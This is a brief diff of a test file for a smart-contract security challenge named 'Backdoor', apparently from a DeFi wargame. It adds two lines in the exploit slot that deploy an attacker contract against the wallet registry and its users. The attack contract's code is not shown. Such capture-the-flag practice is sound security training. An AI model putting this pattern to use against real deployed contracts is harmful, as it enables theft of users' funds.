@@ -37,13 +37,15 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const AttackBackdoor = await ethers.getContractFactory("AttackBackdoor", attacker);
+        this.attackerContract = await AttackBackdoor.deploy(this.walletRegistry.address, users)
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
         for (let i = 0; i < users.length; i++) {
             let wallet = await this.walletRegistry.wallets(users[i]);
-            
             // User must have registered a wallet
             expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");
 
